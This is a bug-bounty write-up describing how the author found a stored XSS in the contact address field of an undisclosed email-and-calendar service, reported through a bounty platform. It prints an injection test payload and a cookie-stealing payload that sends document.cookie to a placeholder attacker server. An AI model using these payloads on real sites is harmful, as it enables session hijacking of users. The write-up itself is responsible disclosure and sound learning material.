---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-05-13_how-i-find-my-first-stored-xss.md
original_filename: 2021-05-13_how-i-find-my-first-stored-xss.md
title: How I find my first Stored XSS
category: documents
detected_topics:
- xss
- sso
- command-injection
tags:
- imported
- documents
- xss
- sso
- command-injection
language: en
raw_sha256: 70d676ead7c88af145c19330f7e89d36e780db806fcc3b0cbfd7b22b31f814c0
text_sha256: f1d9837271f580f924527069d43c19ad596e68864c37a71c9a6f3bee091e5ab3
ingested_at: '2026-06-28T07:32:06Z'
sensitivity: unknown
redactions_applied: false
---

# How I find my first Stored XSS

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-05-13_how-i-find-my-first-stored-xss.md
- Source Type: markdown
- Detected Topics: xss, sso, command-injection
- Ingested At: 2026-06-28T07:32:06Z
- Redactions Applied: False
- Raw SHA256: `70d676ead7c88af145c19330f7e89d36e780db806fcc3b0cbfd7b22b31f814c0`
- Text SHA256: `f1d9837271f580f924527069d43c19ad596e68864c37a71c9a6f3bee091e5ab3`


## Content

---
title: "How I find my first Stored XSS"
page_title: "How I found my first Stored XSS: 650€ | by Filipe Azevedo | Medium"
url: "https://filipaze.medium.com/how-i-find-my-first-stored-xss-c6f57155cc1a"
authors: ["Filipe Azevedo (@filipaze_)"]
bugs: ["Stored XSS"]
publication_date: "2021-05-13"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3659
scraped_via: "browseros"
---

# How I find my first Stored XSS

How I found my first Stored XSS: 650€
Filipe Azevedo
Follow
2 min read
·
May 13, 2021

40

1

Press enter or click to view image in full size
https://www.varonis.com/blog/government-hacking-exploits/
Introduction:

Hi everyone! 🎉

My name is Filipe Azevedo, known as filipaze on the internet. This is my first write-up. 😃

How I started:

During the COVID-19 pandemic with nothing to do between classes, I ventured into the world of cybersecurity and started doing bug bounties in October last year.

So, let’s go to the funny part:

I started the recon on a target that for obvious reasons I can’t disclose. It was a service similar to Google, has an email service, calendar, etc.

The part that caught my attention the most was the agenda service, which allowed you to save contacts and share them with someone.

Like every time I start hacking a target I use the app as a normal user and in the process I fill every input with <img src=x onerror=alert()>’”${{2*2}}

With this payload, I test for HTML injection, XSS, and code injection. All of this, with one payload 😇

The site made it possible to associate an address with a contact. In the final contact, a map for the address was added along with the other contact details, and that was where the bug was. I notice that if I put the payload <imf src=x onerror=alert()> on the address input, the XSS was triggered. So, I have a Stored XSS in my hands.

But happiness was short-lived. I realized that if the payload escaped a little from what I put in initially, it would stop working. For example, is I change this:

Get Filipe Azevedo’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

<img src=x onerror=alert()>

to this:

<img src=x onerror=alert(“hacked”)>

the payload stopped working.

But suddenly I thought if this address is going to be used to serve a map to the user, maybe if he finds a location for my address, the payload will work. So I tried! And guess what! IT WORKED!!!!!

So now, I was able to deliver any payload to the victim just by adding a city before the payload. Before reporting this to the company I tried successfully steal my account’s cookies. This was the payload I used to do that:

new york <img src=x onerror=this.src=’<PUT_HERE_YOUR_SERVER>?’+document.cookie> (I used ngrok)

Yes, this payload generates an unlimited number of requests to your server, but I was limited to 100 characters, so I needed to keep it the smallest possible.

I reported to the company and got rewarded 2 weeks and a half later.

Timeline:

26–04–2021: Reported to the company

27–04–2021: Triaged by Intigriti

03–05–2021: Validated by the company

12–05–2021: Rewarded €€€!
